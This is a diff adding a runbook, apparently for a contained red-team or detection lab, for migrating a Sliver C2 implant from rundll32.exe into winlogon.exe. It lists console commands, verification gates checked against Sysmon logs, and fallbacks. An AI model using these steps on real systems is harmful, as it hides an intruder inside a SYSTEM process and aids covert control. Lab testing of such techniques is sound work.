@@ -1,0 +1,37 @@
+Migration into winlogon.exe
+
+Preconditions
+  - WS01 stage is running under rundll32.exe and `whoami` returns `nt authority\system`
+  - VMware snapshot taken immediately before this sequence
+  - Sysmon E8 logging enabled on WS01 (empty `exclude` rule group = log all)
+
+Sequence (Sliver console, WS01 session selected)
+
+  sessions                       # note the current session id and name
+  ps -e | grep -i rundll32       # confirm the host process of the stage
+  migrate --process-name winlogon.exe
+  sessions                       # a second session with the same name appears
+  use <new-session-id>
+  whoami                         # nt authority\system
+  getpid                         # equals the winlogon PID from ps
+  execute -o cmd.exe /c "whoami /priv"   # child of winlogon, SYSTEM token
+
+Verification gates
+
+  new session present ............ yes, same name, different PID
+  whoami in new session .......... nt authority\system
+  getpid ......................... equals winlogon PID
+  child parent image ............. winlogon.exe in Sysmon E1
+  host stable for 10 minutes ..... no bugcheck
+
+Fallbacks
+
+  - `migrate --pid <pid>` when name resolution selects an unexpected process
+  - keep the rundll32 session open for the rest of the run; do not close it until the
+    winlogon session has executed at least one command successfully
+  - if the new session dies, revert to the snapshot and re-run from the service stage
+
+Do not
+  - migrate into lsass.exe
+  - close the rundll32 session before the winlogon session is verified
+  - run this step without a snapshot
